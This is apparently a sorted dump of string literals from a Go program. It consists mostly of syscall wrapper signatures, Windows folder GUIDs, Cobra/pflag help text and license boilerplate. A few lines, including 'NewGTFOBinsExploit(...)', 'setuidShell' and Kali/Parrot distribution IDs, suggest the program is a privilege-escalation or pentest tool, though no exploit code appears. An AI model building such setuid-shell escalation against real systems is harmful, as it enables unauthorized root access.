"KNOWNFOLDERID{0x6f0cd92b, 0x2e97, 0x45d1, [8]byte{0x88, 0xff, 0xb0, 0xd1, 0x86, 0xb8, 0xde, 0xdd}}"
"KNOWNFOLDERID{0x724ef170, 0xa42d, 0x4fef, [8]byte{0x9f, 0x26, 0xb6, 0x0e, 0x84, 0x6f, 0xba, 0x4f}}"
"KNOWNFOLDERID{0x767e6811, 0x49cb, 0x4273, [8]byte{0x87, 0xc2, 0x20, 0xf3, 0x55, 0xe1, 0x08, 0x5b}}"
"KNOWNFOLDERID{0x76fc4e2d, 0xd6ad, 0x4519, [8]byte{0xa6, 0x63, 0x37, 0xbd, 0x56, 0x06, 0x81, 0x85}}"
"KNOWNFOLDERID{0x7ad67899, 0x66af, 0x43ba, [8]byte{0x91, 0x56, 0x6a, 0xad, 0x42, 0xe6, 0xc5, 0x96}}"
"KNOWNFOLDERID{0x7b0db17d, 0x9cd2, 0x4a93, [8]byte{0x97, 0x33, 0x46, 0xcc, 0x89, 0x02, 0x2e, 0x7c}}"
"KNOWNFOLDERID{0x7b396e54, 0x9ec5, 0x4300, [8]byte{0xbe, 0x0a, 0x24, 0x82, 0xeb, 0xae, 0x1a, 0x26}}"
"KNOWNFOLDERID{0x7be16610, 0x1f7f, 0x44ac, [8]byte{0xbf, 0xf0, 0x83, 0xe1, 0x5f, 0x2f, 0xfc, 0xa1}}"
"KNOWNFOLDERID{0x7c5a40ef, 0xa0fb, 0x4bfc, [8]byte{0x87, 0x4a, 0xc0, 0xf2, 0xe0, 0xb9, 0xfa, 0x8e}}"
"KNOWNFOLDERID{0x7cfbefbc, 0xde1f, 0x45aa, [8]byte{0xb8, 0x43, 0xa5, 0x42, 0xac, 0x53, 0x6c, 0xc9}}"
"KNOWNFOLDERID{0x7d1d3a04, 0xdebb, 0x4115, [8]byte{0x95, 0xcf, 0x2f, 0x29, 0xda, 0x29, 0x20, 0xda}}"
"KNOWNFOLDERID{0x7d83ee9b, 0x2244, 0x4e70, [8]byte{0xb1, 0xf5, 0x53, 0x93, 0x04, 0x2a, 0xf1, 0xe4}}"
"KNOWNFOLDERID{0x7e636bfe, 0xdfa9, 0x4d5e, [8]byte{0xb4, 0x56, 0xd7, 0xb3, 0x98, 0x51, 0xd8, 0xa9}}"
"KNOWNFOLDERID{0x82a5ea35, 0xd9cd, 0x47c5, [8]byte{0x96, 0x29, 0xe1, 0x5d, 0x2f, 0x71, 0x4e, 0x6e}}"
"KNOWNFOLDERID{0x82a74aeb, 0xaeb4, 0x465c, [8]byte{0xa0, 0x14, 0xd0, 0x97, 0xee, 0x34, 0x6d, 0x63}}"
"KNOWNFOLDERID{0x859ead94, 0x2e85, 0x48ad, [8]byte{0xa7, 0x1a, 0x09, 0x69, 0xcb, 0x56, 0xa6, 0xcd}}"
"KNOWNFOLDERID{0x8983036c, 0x27c0, 0x404b, [8]byte{0x8f, 0x08, 0x10, 0x2d, 0x10, 0xdc, 0xfd, 0x74}}"
"KNOWNFOLDERID{0x8ad10c31, 0x2adb, 0x4296, [8]byte{0xa8, 0xf7, 0xe4, 0x70, 0x12, 0x32, 0xc9, 0x72}}"
"KNOWNFOLDERID{0x905e63b6, 0xc1bf, 0x494e, [8]byte{0xb2, 0x9c, 0x65, 0xb7, 0x32, 0xd3, 0xd2, 0x1a}}"
"KNOWNFOLDERID{0x9274bd8d, 0xcfd1, 0x41c3, [8]byte{0xb3, 0x5e, 0xb1, 0x3f, 0x55, 0xa7, 0x58, 0xf4}}"
"KNOWNFOLDERID{0x98ec0e18, 0x2098, 0x4d44, [8]byte{0x86, 0x44, 0x66, 0x97, 0x93, 0x15, 0xa2, 0x81}}"
"KNOWNFOLDERID{0x9b74b6a3, 0x0dfd, 0x4f11, [8]byte{0x9e, 0x78, 0x5f, 0x78, 0x00, 0xf2, 0xe7, 0x72}}"
"KNOWNFOLDERID{0x9e3995ab, 0x1f9c, 0x4f13, [8]byte{0xb8, 0x27, 0x48, 0xb2, 0x4b, 0x6c, 0x71, 0x74}}"
"KNOWNFOLDERID{0x9e52ab10, 0xf80d, 0x49df, [8]byte{0xac, 0xb8, 0x43, 0x30, 0xf5, 0x68, 0x78, 0x55}}"
"KNOWNFOLDERID{0xa0c69a99, 0x21c8, 0x4671, [8]byte{0x87, 0x03, 0x79, 0x34, 0x16, 0x2f, 0xcf, 0x1d}}"
"KNOWNFOLDERID{0xa302545d, 0xdeff, 0x464b, [8]byte{0xab, 0xe8, 0x61, 0xc8, 0x64, 0x8d, 0x93, 0x9b}}"
"KNOWNFOLDERID{0xa305ce99, 0xf527, 0x492b, [8]byte{0x8b, 0x1a, 0x7e, 0x76, 0xfa, 0x98, 0xd6, 0xe4}}"
"KNOWNFOLDERID{0xa3918781, 0xe5f2, 0x4890, [8]byte{0xb3, 0xd9, 0xa7, 0xe5, 0x43, 0x32, 0x32, 0x8c}}"
"KNOWNFOLDERID{0xa4115719, 0xd62e, 0x491d, [8]byte{0xaa, 0x7c, 0xe7, 0x4b, 0x8b, 0xe3, 0xb0, 0x67}}"
"KNOWNFOLDERID{0xa440879f, 0x87a0, 0x4f7d, [8]byte{0xb7, 0x00, 0x02, 0x07, 0xb9, 0x66, 0x19, 0x4a}}"
"KNOWNFOLDERID{0xa520a1a4, 0x1780, 0x4ff6, [8]byte{0xbd, 0x18, 0x16, 0x73, 0x43, 0xc5, 0xaf, 0x16}}"
"KNOWNFOLDERID{0xa52bba46, 0xe9e1, 0x435f, [8]byte{0xb3, 0xd9, 0x28, 0xda, 0xa6, 0x48, 0xc0, 0xf6}}"
"KNOWNFOLDERID{0xa63293e8, 0x664e, 0x48db, [8]byte{0xa0, 0x79, 0xdf, 0x75, 0x9e, 0x05, 0x09, 0xf7}}"
"KNOWNFOLDERID{0xa75d362e, 0x50fc, 0x4fb7, [8]byte{0xac, 0x2c, 0xa8, 0xbe, 0xaa, 0x31, 0x44, 0x93}}"
"KNOWNFOLDERID{0xa77f5d77, 0x2e2b, 0x44c3, [8]byte{0xa6, 0xa2, 0xab, 0xa6, 0x01, 0x05, 0x4a, 0x51}}"
"KNOWNFOLDERID{0xa990ae9f, 0xa03b, 0x4e80, [8]byte{0x94, 0xbc, 0x99, 0x12, 0xd7, 0x50, 0x41, 0x04}}"
"KNOWNFOLDERID{0xaaa8d5a5, 0xf1d6, 0x4259, [8]byte{0xba, 0xa8, 0x78, 0xe7, 0xef, 0x60, 0x83, 0x5e}}"
"KNOWNFOLDERID{0xab5fb87b, 0x7ce2, 0x4f83, [8]byte{0x91, 0x5d, 0x55, 0x08, 0x46, 0xc9, 0x53, 0x7b}}"
"KNOWNFOLDERID{0xae50c081, 0xebd2, 0x438a, [8]byte{0x86, 0x55, 0x8a, 0x09, 0x2e, 0x34, 0x98, 0x7a}}"
"KNOWNFOLDERID{0xb250c668, 0xf57d, 0x4ee1, [8]byte{0xa6, 0x3c, 0x29, 0x0e, 0xe7, 0xd1, 0xaa, 0x1f}}"
"KNOWNFOLDERID{0xb2c5e279, 0x7add, 0x439f, [8]byte{0xb2, 0x8c, 0xc4, 0x1f, 0xe1, 0xbb, 0xf6, 0x72}}"
"KNOWNFOLDERID{0xb4bfcc3a, 0xdb2c, 0x424c, [8]byte{0xb0, 0x29, 0x7f, 0xe9, 0x9a, 0x87, 0xc6, 0x41}}"
"KNOWNFOLDERID{0xb6ebfb86, 0x6907, 0x413c, [8]byte{0x9a, 0xf7, 0x4f, 0xc2, 0xab, 0xf0, 0x7c, 0xc5}}"
"KNOWNFOLDERID{0xb7534046, 0x3ecb, 0x4c18, [8]byte{0xbe, 0x4e, 0x64, 0xcd, 0x4c, 0xb7, 0xd6, 0xac}}"
"KNOWNFOLDERID{0xb7bede81, 0xdf94, 0x4682, [8]byte{0xa7, 0xd8, 0x57, 0xa5, 0x26, 0x20, 0xb8, 0x6f}}"
"KNOWNFOLDERID{0xb94237e7, 0x57ac, 0x4347, [8]byte{0x91, 0x51, 0xb0, 0x8c, 0x6c, 0x32, 0xd1, 0xf7}}"
"KNOWNFOLDERID{0xb97d20bb, 0xf46a, 0x4c97, [8]byte{0xba, 0x10, 0x5e, 0x36, 0x08, 0x43, 0x08, 0x54}}"
"KNOWNFOLDERID{0xbcb5256f, 0x79f6, 0x4cee, [8]byte{0xb7, 0x25, 0xdc, 0x34, 0xe4, 0x02, 0xfd, 0x46}}"
"KNOWNFOLDERID{0xbcbd3057, 0xca5c, 0x4622, [8]byte{0xb4, 0x2d, 0xbc, 0x56, 0xdb, 0x0a, 0xe5, 0x16}}"
"KNOWNFOLDERID{0xbfb9d5e0, 0xc6a9, 0x404c, [8]byte{0xb2, 0xb2, 0xae, 0x6d, 0xb6, 0xaf, 0x49, 0x68}}"
"KNOWNFOLDERID{0xc1bae2d0, 0x10df, 0x4334, [8]byte{0xbe, 0xdd, 0x7a, 0xa2, 0x0b, 0x22, 0x7a, 0x9d}}"
"KNOWNFOLDERID{0xc3f2459e, 0x80d6, 0x45dc, [8]byte{0xbf, 0xef, 0x1f, 0x76, 0x9f, 0x2b, 0xe7, 0x30}}"
"KNOWNFOLDERID{0xc4900540, 0x2379, 0x4c75, [8]byte{0x84, 0x4b, 0x64, 0xe6, 0xfa, 0xf8, 0x71, 0x6b}}"
"KNOWNFOLDERID{0xc4aa340d, 0xf20f, 0x4863, [8]byte{0xaf, 0xef, 0xf8, 0x7e, 0xf2, 0xe6, 0xba, 0x25}}"
"KNOWNFOLDERID{0xc5abbf53, 0xe17f, 0x4121, [8]byte{0x89, 0x00, 0x86, 0x62, 0x6f, 0xc2, 0xc9, 0x73}}"
"KNOWNFOLDERID{0xc870044b, 0xf49e, 0x4126, [8]byte{0xa9, 0xc3, 0xb5, 0x2a, 0x1f, 0xf4, 0x11, 0xe8}}"
"KNOWNFOLDERID{0xcac52c1a, 0xb53d, 0x4edc, [8]byte{0x92, 0xd7, 0x6b, 0x2e, 0x8a, 0xc1, 0x94, 0x34}}"
"KNOWNFOLDERID{0xd0384e7d, 0xbac3, 0x4797, [8]byte{0x8f, 0x14, 0xcb, 0xa2, 0x29, 0xb3, 0x92, 0xb5}}"
"KNOWNFOLDERID{0xd20beec4, 0x5ca8, 0x4905, [8]byte{0xae, 0x3b, 0xbf, 0x25, 0x1e, 0xa0, 0x9b, 0x53}}"
"KNOWNFOLDERID{0xd65231b0, 0xb2f1, 0x4857, [8]byte{0xa4, 0xce, 0xa8, 0xe7, 0xc6, 0xea, 0x7d, 0x27}}"
"KNOWNFOLDERID{0xd9dc8a3b, 0xb784, 0x432e, [8]byte{0xa7, 0x81, 0x5a, 0x11, 0x30, 0xa7, 0x59, 0x63}}"
"KNOWNFOLDERID{0xdbe8e08e, 0x3053, 0x4bbc, [8]byte{0xb1, 0x83, 0x2a, 0x7b, 0x2b, 0x19, 0x1e, 0x59}}"
"KNOWNFOLDERID{0xde61d971, 0x5ebc, 0x4f02, [8]byte{0xa3, 0xa9, 0x6c, 0x82, 0x89, 0x5e, 0x5c, 0x04}}"
"KNOWNFOLDERID{0xde92c1c7, 0x837f, 0x4f69, [8]byte{0xa3, 0xbb, 0x86, 0xe6, 0x31, 0x20, 0x4a, 0x23}}"
"KNOWNFOLDERID{0xde974d24, 0xd9c6, 0x4d3e, [8]byte{0xbf, 0x91, 0xf4, 0x45, 0x51, 0x20, 0xb9, 0x17}}"
"KNOWNFOLDERID{0xdebf2536, 0xe1a8, 0x4c59, [8]byte{0xb6, 0xa2, 0x41, 0x45, 0x86, 0x47, 0x6a, 0xea}}"
"KNOWNFOLDERID{0xdf7266ac, 0x9274, 0x4867, [8]byte{0x8d, 0x55, 0x3b, 0xd6, 0x61, 0xde, 0x87, 0x2d}}"
"KNOWNFOLDERID{0xdfdf76a2, 0xc82a, 0x4d63, [8]byte{0x90, 0x6a, 0x56, 0x44, 0xac, 0x45, 0x73, 0x85}}"
"KNOWNFOLDERID{0xe25b5812, 0xbe88, 0x4bd9, [8]byte{0x94, 0xb0, 0x29, 0x23, 0x34, 0x77, 0xb6, 0xc3}}"
"KNOWNFOLDERID{0xe555ab60, 0x153b, 0x4d17, [8]byte{0x9f, 0x04, 0xa5, 0xfe, 0x99, 0xfc, 0x15, 0xec}}"
"KNOWNFOLDERID{0xed4824af, 0xdce4, 0x45a8, [8]byte{0x81, 0xe2, 0xfc, 0x79, 0x65, 0x08, 0x36, 0x34}}"
"KNOWNFOLDERID{0xedc0fe71, 0x98d8, 0x4f4a, [8]byte{0xb9, 0x20, 0xc8, 0xdc, 0x13, 0x3c, 0xb1, 0x65}}"
"KNOWNFOLDERID{0xee32e446, 0x31ca, 0x4aba, [8]byte{0x81, 0x4f, 0xa5, 0xeb, 0xd2, 0xfd, 0x6d, 0x5e}}"
"KNOWNFOLDERID{0xf1b32785, 0x6fba, 0x4fcf, [8]byte{0x9d, 0x55, 0x7b, 0x8e, 0x7f, 0x15, 0x70, 0x91}}"
"KNOWNFOLDERID{0xf26305ef, 0x6948, 0x40b9, [8]byte{0xb2, 0x55, 0x81, 0x45, 0x3d, 0x09, 0xc7, 0x85}}"
"KNOWNFOLDERID{0xf38bf404, 0x1d43, 0x42f2, [8]byte{0x93, 0x05, 0x67, 0xde, 0x0b, 0x28, 0xfc, 0x23}}"
"KNOWNFOLDERID{0xf3ce0f7c, 0x4901, 0x4acc, [8]byte{0x86, 0x48, 0xd5, 0xd4, 0x4b, 0x04, 0xef, 0x8f}}"
"KNOWNFOLDERID{0xf42ee2d3, 0x909f, 0x4907, [8]byte{0x88, 0x71, 0x4c, 0x22, 0xfc, 0x0b, 0xf7, 0x56}}"
"KNOWNFOLDERID{0xf7f1ed05, 0x9f6d, 0x47a2, [8]byte{0xaa, 0xae, 0x29, 0xd3, 0x17, 0xc6, 0xf0, 0x66}}"
"KNOWNFOLDERID{0xfd228cb7, 0xae11, 0x4ae3, [8]byte{0x86, 0x4c, 0x16, 0xf3, 0x91, 0x0a, 0xb8, 0xfe}}"
"KNOWNFOLDERID{0xfdd39ad0, 0x238f, 0x46af, [8]byte{0xad, 0xb4, 0x6c, 0x85, 0x48, 0x03, 0x69, 0xc7}}"
"Kali         DistributionID = ""kali"""
"Kevent_t, fd, mode, flags int) {"
"KeyctlBuffer(cmd int, arg2 int, buf []byte, arg5 int) (ret int, err error) = SYS_KEYCTL"
"KeyctlDHParams, buf []byte) (ret int, err error) = SYS_KEYCTL"
"KeyctlDHParams, buf []byte) (ret int, err error) {"
"KeyctlDHParams, buffer []byte) (size int, err error) {"
"KeyctlInt(cmd int, arg2 int, arg3 int, arg4 int, arg5 int) (ret int, err error) = SYS_KEYCTL"
"Kill(pid int, sig Signal) (err error)"
"Kill(pid int, sig syscall.Signal) (err error)"
"Kill(pid int, signum syscall.Signal) (err error)"
"KinfoProc, error) {"
"Klogctl(typ int, buf []byte) (n int, err error) = SYS_SYSLOG"
"Klogctl(typ int, buf []byte) (n int, err error) = syslog"
"Kqueue() (fd int, err error)"
"LCA64(R8), R8"
"LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,"
"LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES"
"LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR"
"LazyDLL{Name: name, System: true}"
"LazyProc) Call(a ...uintptr) (r1, r2 uintptr, lastErr error) {"
"LazyProc{l: d, Name: name}"
"Lchown(path string, uid int, gid int) (err error) = SYS_LCHOWN32"
"Lchown(path string, uid int, gid int) (err error) = SYS___LCHOWN_A"
"Lchown(path string, uid int, gid int) (err error)"
"Len:    int64(0),"
"Len: int32(len(cl)),"
"Len: int32(len(data)),"
"Lgetxattr(path string, attr string, dest []byte) (sz int, err error)"
"Licensed under the Apache License, Version 2.0 (the ""License"")"
"Like help, the function and template are overridable through public methods:"
"Linger, error) {"
"Link(path string, link string) (err error) = SYS___LINK_A"
"Link(path string, link string) (err error)"
"Linkat(olddirfd int, oldpath string, newdirfd int, newpath string, flags int) (err error)"
"Linkat(pathfd int, path string, linkfd int, link string, flags int) (err error)"
"Listen(s int, backlog int) (err error) = libsocket.__xnet_llisten"
"Listen(s int, backlog int) (err error)"
"Listen(s int, n int) (err error)"
"Listxattr(path string, dest []byte) (sz int, err error)"
"Llistxattr(path string, dest []byte) (sz int, err error)"
"LoadLibrary(libname string) (handle Handle, err error) = LoadLibraryW"
"LoadLibraryEx(libname string, zero Handle, flags uintptr) (handle Handle, err error) = LoadLibraryExW"
"LoadResource(module Handle, resInfo Handle) (resData Handle, err error) = kernel32.LoadResource"
"LocalAlloc(flags uint32, length uint32) (ptr uintptr, err error)"
"LocalFree(hmem Handle) (handle Handle, err error) [failretval!=0]"
"LockFileEx(file Handle, flags uint32, reserved uint32, bytesLow uint32, bytesHigh uint32, overlapped "
"LockResource(resData Handle) (addr uintptr, err error) = kernel32.LockResource"
"LockablePipe) Read(p []byte) (n int, err error) {"
"LockablePipe) WaitForString(expected string, until time.Duration) error {"
"Long:    get_long,"
"Long:  status_long,"
"Long: fmt.Sprintf(""%[2]s is a special command that is used by the shell completion logic"
"Lremovexattr(path string, attr string) (err error)"
"Lsetxattr(path string, attr string, data []byte, flags int) (err error)"
"Lstat(path string, stat "
"MAX_INF_SECTION_NAME_LENGTH = 255  // For Windows 9x compatibility, INF section names should be constrained to 32 characters."
"MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT."
"MOVD 0x3D0(R9), R9"
"MOVD CAA(R8), R9"
"MOVD LCA64(R8), R8"
"MOVD R9, ret"
"MOVW PSALAA, R8"
"Madvise(b []byte, advice int) (err error)"
"Madvise(b []byte, behav int) (err error)"
"Magenta: []byte{keyEscape, '[', '3', '5', 'm'},"
"MapViewOfFile(handle Handle, access uint32, offsetHigh uint32, offsetLow uint32, length uintptr) (addr uintptr, err error)"
"MaximumLength, Length uint32"
"Maxlen: int32(len(cl)),"
"Maxlen: int32(len(data)),"
"MemfdCreate(name string, flags int) (fd int, err error)"
"MemfdSecret(flags int) (fd int, err error)"
"MemoryBasicInformation, length uintptr) (err error) = kernel32.VirtualQuery"
"MemoryBasicInformation, length uintptr) (err error) = kernel32.VirtualQueryEx"
"MemoryBasicInformation, length uintptr) (err error) {"
"MessageBox(hwnd HWND, text "
"Microsoft                 // Reserved, Microsoft Corporation backward compatibility."
"Mkdir(dirfd int, path string, mode uint32) (err error)"
"Mkdir(path string, mode uint32) (err error) = SYS___MKDIR_A"
"Mkdir(path string, mode uint32) (err error)"
"Mkdirat(dirfd int, path string, mode uint32) (err error)"
"Mkfifo(path string, mode uint32) (err error)"
"Mkfifoat(dirfd int, path string, mode uint32) (err error)"
"Mknod(path string, mode uint32, dev int) (err error) = SYS___MKNOD_A"
"Mknod(path string, mode uint32, dev int) (err error)"
"Mknodat(dirfd int, path string, mode uint32, dev int) (err error)"
"Mknodat(fd int, path string, mode uint32, dev int) (err error)"
"ModTime: time.Now(),"
"Mode:    0644,"
"Mode:    old.Mode,"
"Module32First(snapshot Handle, moduleEntry "
"Module32Next(snapshot Handle, moduleEntry "
"ModuleInfo, cb uint32) (err error) = psapi.GetModuleInformation"
"ModuleInfo, cb uint32) (err error) {"
"Most code never instantiates this struct directly, and instead uses"
"Most of the time completions will only show sub-commands. But if a flag is required to make a sub-command work, you probably want it to show up when the user types [tab][tab].  You can mark a flag as 'Required' like so:"
"Mount(fsType string, dir string, flags int, data unsafe.Pointer) (err error)"
"MountAttr, size uintptr) (err error) = SYS_MOUNT_SETATTR"
"MountAttr, size uintptr) (err error) {"
"MoveMount(fromDirfd int, fromPathName string, toDirfd int, toPathName string, flags int) (err error)"
"Mozilla Public License, version 2.0"
"Mprotect(b []byte, prot int) (err error)"
"Msg:     ""Failed to find "" "
"Msg:     ""Failed to load "" "
"Msghdr, flags int) (int, error) {"
"Msghdr, flags int) (n int, err error) = SYS___RECVMSG_A"
"Msghdr, flags int) (n int, err error) = SYS___SENDMSG_A"
"Msghdr, flags int) (n int, err error) = libsocket.__xnet_recvmsg"
"Msghdr, flags int) (n int, err error) = libsocket.__xnet_sendmsg"
"Msghdr, flags int) (n int, err error) = nrecvmsg"
"Msghdr, flags int) (n int, err error) = nsendmsg"
"Msghdr, flags int) (n int, err error) {"
"Msghdr, flags int) (n int, err error)"
"Msync(b []byte, flags int) (err error)"
"Mtim:    old.Mtim,"
"MultiByteToWideChar(codePage uint32, dwFlags uint32, str "
"NFCProtocol:    pp.Nfc_protocol,"
"NFCProtocol: pp.Nfc_protocol,"
"NFC_GENL_MCAST_EVENT_NAME                   = ""events"""
"NFC_GENL_NAME                               = ""nfc"""
"NL80211_GENL_NAME                                       = ""nl80211"""
"NL80211_MULTICAST_GROUP_CONFIG                          = ""config"""
"NL80211_MULTICAST_GROUP_MLME                            = ""mlme"""
"NL80211_MULTICAST_GROUP_NAN                             = ""nan"""
"NL80211_MULTICAST_GROUP_REG                             = ""regulatory"""
"NL80211_MULTICAST_GROUP_SCAN                            = ""scan"""
"NL80211_MULTICAST_GROUP_TESTMODE                        = ""testmode"""
"NL80211_MULTICAST_GROUP_VENDOR                          = ""vendor"""
"NOFRAME,$0-0"
"NTString, error) {"
"NTString, sourceString "
"NTUnicodeString, error) {"
"NTUnicodeString, ntFileNamePart "
"NTUnicodeString, sourceString "
"Name:          name,"
"Name:        ""namespace"","
"Name:      name,"
"Name:    ""Dockerfile"","
"Name:   name,"
"Name:   string(name[:]),"
"Name:  goflag.Name,"
"Name: name,"
"NameSpaceDNS  = Must(Parse(""6ba7b810-9dad-11d1-80b4-00c04fd430c8""))"
"NameSpaceOID  = Must(Parse(""6ba7b812-9dad-11d1-80b4-00c04fd430c8""))"
"NameSpaceURL  = Must(Parse(""6ba7b811-9dad-11d1-80b4-00c04fd430c8""))"
"NameSpaceX500 = Must(Parse(""6ba7b814-9dad-11d1-80b4-00c04fd430c8""))"
"Namemax: old.Namemax,"
"NewGTFOBinsExploit(binaryName, inputs, args, envs, tmpFileContent),"
"Next, include Cobra in your application:"
"Nil           UUID // empty UUID, all zeros"
"Nlink:   uint64(old.Nlink),"
"Note that those examples are for demonstration purpose only, to showcase how to use the library. They are not meant to be used in any kind of production environment."
"Note that usage message is essential here, and it should not be empty."
"NotifyServiceStatusChange(service Handle, notifyMask uint32, notifier "
"Nsec: int64(x.Nsec),"
"NsecToTimespec(TimevalToNsec(tv[0])),"
"NsecToTimespec(TimevalToNsec(tv[1])),"
"NsecToTimeval(TimespecToNsec(ts[0])),"
"NsecToTimeval(TimespecToNsec(ts[1])),"
"NtQueryInformationProcess(proc Handle, procInfoClass int32, procInfo unsafe.Pointer, procInfoLen uint32, retLen "
"NtQuerySystemInformation(sysInfoClass int32, sysInfo unsafe.Pointer, sysInfoLen uint32, retLen "
"NtSetInformationFile(handle Handle, iosb "
"NtSetInformationProcess(proc Handle, procInfoClass int32, procInfo unsafe.Pointer, procInfoLen uint32) (ntstatus error) = ntdll.NtSetInformationProcess"
"NtSetSystemInformation(sysInfoClass int32, sysInfo unsafe.Pointer, sysInfoLen uint32) (ntstatus error) = ntdll.NtSetSystemInformation"
"OBJECT_ATTRIBUTES, iosb "
"OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE."
"OID_PKIX_KP_SERVER_AUTH = []byte(""1.3.6.1.5.5.7.3.1"
"OID_SERVER_GATED_CRYPTO = []byte(""1.3.6.1.4.1.311.10.3.3"
"OID_SGC_NETSCAPE        = []byte(""2.16.840.1.113730.4.1"
"OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, 0)"
"OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR"
"OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE,"
"OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR"
"OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE"
"OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,"
"O_LARGEFILE, mode)"
"O_LARGEFILE, perm)"
"O_TRUNC, mode)"
"ObjName: name,"
"On a Windows machine, was the process invoked by someone double clicking on"
"Open(path string, mode int, perm uint32) (fd int, err error) = open64"
"Open(path string, mode int, perm uint32) (fd int, err error)"
"OpenEvent(desiredAccess uint32, inheritHandle bool, name "
"OpenHow) (fd int, err error) {"
"OpenHow, size int) (fd int, err error) {"
"OpenHow, size int) (fd int, err error)"
"OpenMutex(desiredAccess uint32, inheritHandle bool, name "
"OpenProcess(desiredAccess uint32, inheritHandle bool, processId uint32) (handle Handle, err error)"
"OpenProcessToken(process Handle, access uint32, token "
"OpenSUSE     DistributionID = ""opensuse"""
"OpenService(mgr Handle, serviceName "
"OpenThread(desiredAccess uint32, inheritHandle bool, threadId uint32) (handle Handle, err error)"
"OpenThreadToken(thread Handle, access uint32, openAsSelf bool, token "
"OpenTree(dfd int, fileName string, flags uint) (r int, err error)"
"Openat(dirfd int, path string, flags int, mode uint32) (fd int, err error)"
"Openat(dirfd int, path string, mode int, perm uint32) (fd int, err error)"
"Openat(fdat int, path string, mode int, perm uint32) (fd int, err error)"
"Or, for persistent flags:"
"Overlapped, bytes "
"Overlapped, completionRoutine uintptr) (err error) = kernel32.ReadDirectoryChangesW"
"Overlapped, completionRoutine uintptr) (err error) [failretval==socket_error] = ws2_32.WSAIoctl"
"Overlapped, completionRoutine uintptr) (err error) {"
"Overlapped, croutine "
"Overlapped, done "
"Overlapped, timeout uint32) (err error) {"
"Overlapped, timeout uint32) (err error)"
"Overlapped, transmitFileBuf "
"Owner:   old.Owner,"
"POLLERR: EPOLLERR,"
"POLLHUP: EPOLLHUP,"
"POLLIN:  EPOLLIN,"
"POLLOUT: EPOLLOUT,"
"POLLPRI: EPOLLPRI,"
"PSALAA, R8"
"PSM:      pp.Psm,"
"Package pflag is a drop-in replacement for Go's flag package, implementing"
"Parrot       DistributionID = ""parrot"""
"Path:   path,"
"Path:   setuidShell,"
"Path: path,"
"Pathconf(path string, name int) (val int, err error)"
"PerfEventAttr, pid int, cpu int, groupFd int, flags int) (fd int, err error) {"
"PerfEventAttr, pid int, cpu int, groupFd int, flags int) (fd int, err error)"
"Permission is hereby granted, free of charge, to any person obtaining a copy"
"Permission is hereby granted, free of charge, to any person"
"Pid:    int32(Getppid()),"
"PidfdGetfd(pidfd int, targetfd int, flags int) (fd int, err error) = SYS_PIDFD_GETFD"
"PidfdOpen(pid int, flags int) (fd int, err error) = SYS_PIDFD_OPEN"
"PidfdSendSignal(pidfd int, sig Signal, info "
"PivotRoot(newroot string, putold string) (err error) = SYS_PIVOT_ROOT"
"PollFd, nfds int, timeout "
"PollFd, nfds int, timeout int) (n int, err error) {"
"PollFd, nfds int, timeout int) (n int, err error)"
"Port:  pp.Port,"
"Port: pp.Port,"
"PortEvent, error) {"
"Porting Go to a new architecture/OS combination or adding syscalls, types, or"
"PostQueuedCompletionStatus(cphandle Handle, qty uint32, key uintptr, overlapped "
"Prctl(option int, arg2 uintptr, arg3 uintptr, arg4 uintptr, arg5 uintptr) (err error)"
"Pread(fd int, p []byte, offset int64) (n int, err error)"
"Prlimit(pid int, resource int, newlimit "
"Proc) Call(a ...uintptr) (r1, r2 uintptr, lastErr error) {"
"Proc, err error) {"
"ProcThreadAttributeList, attrcount uint32, flags uint32, size "
"ProcThreadAttributeList, flags uint32, attr uintptr, value unsafe.Pointer, size uintptr, prevvalue unsafe.Pointer, returnedsize "
"ProcThreadAttributeList, use NewProcThreadAttributeList, update"
"ProcThreadAttributeListContainer) Update(attribute uintptr, value unsafe.Pointer, size uintptr) error {"
"ProcThreadAttributeListContainer, error) {"
"Process32First           = kernel.MustFindProc(""Process32FirstW"")"
"Process32First(snapshot Handle, procEntry "
"Process32Next            = kernel.MustFindProc(""Process32NextW"")"
"Process32Next(snapshot Handle, procEntry "
"ProcessEntry32, error) {"
"ProcessIdToSessionId(pid uint32, sessionid "
"ProcessVMReadv(pid int, localIov []Iovec, remoteIov []RemoteIovec, flags uint) (n int, err error) = SYS_PROCESS_VM_READV"
"ProcessVMWritev(pid int, localIov []Iovec, remoteIov []RemoteIovec, flags uint) (n int, err error) = SYS_PROCESS_VM_WRITEV"
"Protoent, err error) [failretval==nil] = ws2_32.getprotobyname"
"Protoent, err error) {"
"Providing Active Help for flags is done in the same fashion as for nouns, but using the completion function registered for the flag.  For example:"
"Pselect(nfd int, r "
"Ptmget, error) {"
"Ptrace(req int, pid int, addr uintptr, data int) (ret uintptr, err error)"
"Pwrite(fd int, p []byte, offset int64) (n int, err error)"
"QUERY_SERVICE_CONFIG, bufSize uint32, bytesNeeded "
"QUERY_SERVICE_LOCK_STATUS, bufSize uint32, bytesNeeded "
"QueryFullProcessImageName(proc Handle, flags uint32, exeName "
"QueryInformationJobObject(job Handle, JobObjectInformationClass int32, JobObjectInformation uintptr, JobObjectInformationLength uint32, retlen "
"QueryServiceConfig(service Handle, serviceConfig "
"QueryServiceConfig2(service Handle, infoLevel uint32, buff "
"QueryServiceDynamicInformation(service Handle, infoLevel uint32, dynamicInfo unsafe.Pointer) (err error) = advapi32.QueryServiceDynamicInformation"
"QueryServiceLockStatus(mgr Handle, lockStatus "
"QueryServiceStatus(service Handle, status "
"QueryServiceStatusEx(service Handle, infoLevel uint32, buff "
"QueueID:      pp.Queue_id,"
"R0, R0           // Reset r0 to 0"
"R0, R0      // Restore R0 to $0."
"R0, R3           // Check if last bit of entry point was set"
"R0, R3"
"R0, R6"
"R0, R7"
"R0, R8"
"R0, R9"
"R0, err"
"R0, r1"
"R0, r2"
"R1, r2"
"R1, rc"
"R12, (2176"
"R15, 0(R9)"
"R15, R1          // Save SVC return code"
